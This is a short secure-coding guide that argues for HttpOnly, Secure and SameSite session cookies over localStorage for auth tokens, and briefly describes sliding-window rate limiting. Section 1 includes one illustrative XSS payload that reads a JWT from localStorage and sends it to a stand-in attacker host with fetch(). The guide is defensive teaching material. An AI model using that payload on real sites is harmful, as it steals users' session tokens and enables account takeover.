# Cryptographic Session Security: localStorage vs. HTTP-Only Cookies

## Threat Model Comparison

| Evaluation Metric | Browser `localStorage` / `sessionStorage` | Cryptographically Signed `HttpOnly` Cookies |
|---|---|---|
| **JavaScript Accessibility** | **Accessible** via `window.localStorage` | **Inaccessible** to client-side scripts |
| **XSS Exfiltration Risk** | **CRITICAL:** Single XSS injection steals all tokens | **LOW:** Tokens cannot be extracted via script |
| **CSRF Exposure** | Immune (unless custom header forged) | Mitigated via `SameSite=Lax` / `SameSite=Strict` |
| **Storage Capacity** | ~5 MB – 10 MB | 4096 bytes per cookie |
| **Transmission Protocol** | Manually appended to `Authorization` header | Automatically transmitted by browser over HTTPS |
| **Recommended Production Standard** | Antipattern for sensitive session tokens | **OWASP Recommended Gold Standard** |

---

## 1. Why `localStorage` is an Architectural Flaw for Auth Tokens

When an application stores JSON Web Tokens (JWTs) in `localStorage`, any arbitrary JavaScript executing within the same origin can read the token:

```javascript
// Malicious XSS payload exfiltrating victim session:
fetch("https://attacker.evil/harvest?token=" + encodeURIComponent(localStorage.getItem("jwt")));
```

Because modern web applications load dozens of third-party dependencies (analytics, chat widgets, marketing pixels), a compromised NPM package or DOM-based XSS vulnerability instantly leads to account takeover.

---

## 2. The Defensive Triple-Lock: `HttpOnly`, `Secure`, and `SameSite`

By transitioning to server-managed session cookies, we enforce a defense-in-depth barrier:
1. `HttpOnly`: Tells the browser that client-side JavaScript (`document.cookie`) has no permission to read or modify the cookie. XSS attacks cannot exfiltrate the session token.
2. `Secure`: Guarantees that the cookie is transmitted only over encrypted TLS (HTTPS) connections, preventing Man-in-the-Middle (MITM) cleartext sniffing.
3. `SameSite=Lax`: Prevents Cross-Site Request Forgery (CSRF) by refusing to send the cookie on cross-site state-changing requests (such as POST forms triggered from an external site).

---

## 3. Sliding Window Rate Limiting Defense

To prevent automated IDOR parameter fuzzing and credential brute-forcing, we enforce sliding window rate limiting. Unlike fixed-window counters that suffer from burst spikes at window boundaries, the sliding window tracks event timestamps within a rolling delta ($T_{\text{now}} - \text{windowMs}$), ensuring sustained rate suppression.
